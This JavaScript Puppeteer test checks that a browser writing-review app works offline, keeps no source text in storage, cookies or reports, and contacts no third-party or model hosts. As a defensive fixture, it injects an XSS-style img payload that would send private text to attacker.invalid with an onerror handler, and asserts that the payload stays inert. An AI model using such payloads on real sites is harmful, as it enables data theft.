'use strict';
/* M5 release gate: genuine Chromium, actual local advisor.
 * Offline AFTER first-party assets finish loading does not imply a fully
 * offline-first website. Source confidentiality and no model traffic tested.
 */
const assert=require('node:assert/strict');
const fs=require('node:fs'),os=require('node:os'),path=require('node:path');
const puppeteer=require('puppeteer-core');
const {serve,chrome}=require('../pdf-browser.test.js');
const WORDS='teh engineering report was recieved at the site. The measured column strength was 25 MPa [12].';
const PRIVATE='PRIVATE_SOURCE_SENTINEL_M5_291847';
const HOSTILE='<img src="https://attacker.invalid/collect?text='+PRIVATE+'" onerror="window.__m5Injected=true">';
const en=WORDS+' Confidential notes: '+PRIVATE+' '+HOSTILE;
const ar='هاذا تقرير مكتوب للمراجعة فقط. بيانات خاصة: '+PRIVATE+' '+HOSTILE;
function delay(ms){return new Promise(resolve=>setTimeout(resolve,ms));}
async function insert(page,text){
 await page.$eval('#source',(el,value)=>{
  el.value=value;el.dispatchEvent(new Event('input',{bubbles:true}));
 },text);
}
async function checkBrowserMemory(page,expectText){
 return page.evaluate(({sentinel,sourceText})=>{
  const storages=[localStorage,sessionStorage].map(storage=>{
   const out=[];
   for(let i=0;i<storage.length;i++){
    const key=storage.key(i),value=storage.getItem(key);
    if(key.includes(sentinel)||String(value).includes(sentinel)||String(value).includes(sourceText))out.push(key);
   }
   return out;
  });
  return {
   text:document.getElementById('source').value,
   snapshot:window.TISAnalysisApp.session.read().text,
   persistedKeys:storages.flat(),
   cookieHasSource:document.cookie.includes(sentinel),
   parsedInjection:typeof window.__m5Injected,
   insertedImage:!!document.querySelector('img[src*="attacker.invalid"]'),
   modelFrame:!!document.querySelector('#tisOnDeviceModel'),
   screen:document.body.dataset.v10Screen
  };
 },{sentinel:PRIVATE,sourceText:expectText});
}
async function run(){
 const folder=fs.mkdtempSync(path.join(os.tmpdir(),'tis-m5-offline-'));
 const output=path.join(folder,'text-integrity-writing-review.json');
 const server=serve();await new Promise(done=>server.listen(0,'127.0.0.1',done));
 const browser=await puppeteer.launch({headless:true,executablePath:chrome,
  args:['--no-sandbox','--disable-dev-shm-usage','--disable-gpu']});
 const exceptions=[],thirdParty=[],posts=[],modelRequests=[],failures=[];
 try{
  for(const language of ['en','ar']){
   const page=await browser.newPage();
   page.on('pageerror',error=>exceptions.push(error.message));
   page.on('request',req=>{
    const url=new URL(req.url());
    if(url.hostname!=='127.0.0.1')thirdParty.push({language,url:url.origin});
    if(!['GET','HEAD'].includes(req.method()))posts.push({language,method:req.method(),url:url.origin});
    if(/ai-runtime\.html|onnx|huggingface|model\.json|tokenizer\.json/i.test(url.href))modelRequests.push(url.href);
   });
   page.on('requestfailed',req=>failures.push({language,url:req.url()}));
   try{
    const cdp=await page.createCDPSession();
    await cdp.send('Page.setDownloadBehavior',{behavior:'allow',downloadPath:folder});
    await page.setViewport({width:language==='ar'?390:1440,height:900});
    await page.goto('http://127.0.0.1:'+server.address().port+'/?v11preview=1',{waitUntil:'load'});
    if(language==='ar')await page.click('#language');
    const text=language==='ar'?ar:en;
    const initial=await checkBrowserMemory(page,text);
    assert.equal(initial.text,'','The first-party V11 editor should be empty on a fresh browser page');
    await page.setOfflineMode(true); // Browser assets have loaded, networking deliberately unavailable.
    await insert(page,text);
    await page.focus('#scanAI');await page.keyboard.press('Enter');
    const review=await checkBrowserMemory(page,text);
    assert.equal(review.screen,'guided-review');
    assert.equal(review.text,text);
    assert.equal(review.snapshot,text);
    assert.deepEqual(review.persistedKeys,[],'Local and session storage must not store source');
    assert.equal(review.cookieHasSource,false);
    assert.equal(review.parsedInjection,'undefined','Untrusted markup must remain inert');
    assert.equal(review.insertedImage,false,'Source markup cannot be rendered as a DOM image');
    assert.equal(review.modelFrame,false,'Primary review must not start the research model');
    assert((await page.$$eval('#tisV11SuggestionList li',els=>els.length))>=1);
    // Apply a correction after reviewing it while offline, and undo the change.
    if(language==='en'){
     const before=await page.$eval('#source',el=>el.value);
     const preview=await page.$('#tisV11SuggestionList .tis-v11-preview-toggle');
     await preview.focus();await page.keyboard.press('Enter');
     const corrected=await page.$('#tisV11SuggestionList .tis-v11-apply:not(:disabled)');
     assert(corrected,'At least one English typo should be safe after explicit preview');
     await corrected.focus();await page.keyboard.press('Enter');
     assert.notEqual(await page.$eval('#source',el=>el.value),before);
     await page.focus('#tisV11Undo');await page.keyboard.press('Enter');
     assert.equal(await page.$eval('#source',el=>el.value),before,
      'Offline apply/undo must restore the exact original source');
     // Download the official report while disconnected.
     await page.focus('#tisV11Export');await page.keyboard.press('Enter');
     for(let i=0;i<50&&!fs.existsSync(output);i++)await delay(100);
     assert(fs.existsSync(output),'The report should be downloadable offline using Blob URL');
     const bytes=fs.readFileSync(output,'utf8'),data=JSON.parse(bytes);
     assert.equal(data.application,'Text Integrity Studio');
     assert(data.analysis&&data.disclaimer);
     assert(!bytes.includes(PRIVATE),'No source sentinel may appear in private report');
     assert(!bytes.includes(HOSTILE),'No source passage may appear in private report');
     assert(!bytes.includes(before),'No full source may appear in report');
    }
    await page.setOfflineMode(false);
    await page.reload({waitUntil:'load'});
    const refreshed=await checkBrowserMemory(page,text);
    assert.equal(refreshed.text,'','Refresh must clear the active local document');
    assert.equal(refreshed.snapshot,'','Session source must be emptied after refresh');
    assert.equal(refreshed.persistedKeys.length,0);
    assert.equal(refreshed.cookieHasSource,false);
    console.log('PASS M5 '+language.toUpperCase()+' privacy: zero persisted source, injection inert, local offline review, reset after refresh');
   }finally{await page.close();}
  }
  assert.deepEqual(thirdParty,[],'No third-party hosts may be contacted during guided review');
  assert.deepEqual(posts,[],'No POST requests may send the document');
  assert.deepEqual(modelRequests,[],'No optional model asset request before explicit opt-in');
  assert.deepEqual(failures,[],'Offline-after-load review must not request unavailable resources');
  assert.deepEqual(exceptions,[],'Browser execution must have no unexpected errors');
  console.log('PASS M5 offline-after-load privacy, blob report and memory reset; full offline-first unsupported and not claimed');
 }finally{
  await browser.close();await new Promise(ok=>server.close(ok));
  fs.rmSync(folder,{recursive:true,force:true});
 }
}
run().catch(e=>{console.error(e);process.exitCode=1;});
